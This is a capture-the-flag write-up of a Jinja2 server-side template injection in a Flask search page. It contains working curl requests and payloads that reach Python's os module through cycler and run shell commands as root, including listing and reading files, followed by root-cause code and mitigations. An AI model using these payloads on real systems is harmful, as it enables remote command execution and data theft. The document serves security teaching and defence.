# Hive Archive Writeup

## Challenge Information

- **Challenge:** Hive Archive
- **Category:** Web
- **Vulnerability:** Server-Side Template Injection, Jinja2 SSTI
- **Target:** `http://0qttar8y.chals.mctf.io`
- **Flag:** `HiveCTF{t3mpl4t3s_dr1p_l1k3_h0n3y}`

## Description

The challenge presents a simple archive website called **The Hive — Golden Archive**. The page contains a search box that sends a GET request to `/search` using the query parameter `q`.

The challenge hint suggests that a secret is hidden somewhere inside the archive system:

> Something is buzzing behind the walls of this archive system. The archivists claim every secret is perfectly preserved where no ordinary visitor could ever reach it. Can you find what's hidden in the comb?

The goal is to find the hidden flag.

## Reconnaissance

First, I defined the target URL:

```bash
base='http://0qttar8y.chals.mctf.io'
```

Then I checked the main page and the search endpoint:

```bash
curl -i "$base/"
curl -i "$base/search"
curl -iG "$base/search" --data-urlencode 'q=test'
```

The `/search?q=test` response reflected my input directly inside the HTML page:

```html
<p class="subtitle">Querying the golden archive for: <em>test</em></p>

<div class="result-value">
test
</div>
```

Since the search query was reflected back into the page, I tested for common injection vulnerabilities.

## Testing for SSTI

I tried several template injection payloads:

```bash
curl -sG "$base/search" --data-urlencode 'q={{7*7}}'
curl -sG "$base/search" --data-urlencode 'q=${7*7}'
curl -sG "$base/search" --data-urlencode 'q=<%= 7*7 %>'
```

The important result was from the Jinja-style payload:

```jinja2
{{7*7}}
```

The server evaluated it and returned:

```text
49
```

This confirmed **Server-Side Template Injection**. Since the `{{ ... }}` syntax was evaluated, the backend was likely using **Jinja2**, commonly seen in Flask applications.

## Confirming Flask/Jinja Context

Next, I checked whether Flask configuration objects were accessible:

```bash
curl -sG "$base/search" --data-urlencode 'q={{config.items()}}'
```

The response returned Flask configuration values such as:

```text
DEBUG=False
SECRET_KEY=None
APPLICATION_ROOT=/
SESSION_COOKIE_NAME=session
```

This confirmed that the input was being rendered inside a Flask/Jinja2 template context.

## Achieving Command Execution

A common Jinja2 SSTI technique is to access Python globals through built-in template helper objects. I used `cycler` to reach Python's `os` module and execute a shell command with `os.popen()`.

Payload:

```jinja2
{{ cycler.__init__.__globals__.os.popen("id").read() }}
```

Request:

```bash
curl -sG "$base/search" \
  --data-urlencode 'q={{ cycler.__init__.__globals__.os.popen("id").read() }}'
```

The response contained:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed remote command execution, and the application was running as `root`.

## Finding the Flag

I listed the root directory:

```bash
curl -sG "$base/search" \
  --data-urlencode 'q={{ cycler.__init__.__globals__.os.popen("ls -la /").read() }}'
```

The output showed a flag file in the root directory:

```text
-rw-r--r--.   1 root root  34 Apr 18 19:39 flag.txt
```

So the flag was likely stored at:

```text
/flag.txt
```

## Reading the Flag

I used the same SSTI command execution primitive to read `/flag.txt`:

```bash
curl -sG "$base/search" \
  --data-urlencode 'q={{ cycler.__init__.__globals__.os.popen("cat /flag.txt").read() }}'
```

The response returned:

```text
HiveCTF{t3mpl4t3s_dr1p_l1k3_h0n3y}
```

## Final Flag

```text
HiveCTF{t3mpl4t3s_dr1p_l1k3_h0n3y}
```

## Root Cause

The application likely rendered user-controlled input as a Jinja2 template instead of treating it as plain text.

A vulnerable Flask pattern might look like this:

```python
from flask import request, render_template_string

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return render_template_string(q)
```

or the user input may have been inserted into a template string before rendering:

```python
return render_template_string(template_with_user_input)
```

Because the input was interpreted as template code, expressions such as this were executed server-side:

```jinja2
{{7*7}}
```

This later allowed access to Python internals and command execution:

```jinja2
{{ cycler.__init__.__globals__.os.popen("id").read() }}
```

## Mitigation

User input should never be rendered as a template. It should be passed to a fixed template as data.

Safer Flask example:

```python
from flask import request, render_template

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return render_template('search.html', query=q)
```

Inside `search.html`:

```html
<p>Query: {{ query }}</p>
```

In this safe version, Jinja treats `query` as data rather than evaluating it as new template code.

Additional protections:

- Avoid `render_template_string()` with user input.
- Escape output properly.
- Run services as a low-privileged user, not root.
- Use sandboxing/container hardening.
- Restrict filesystem access inside containers.
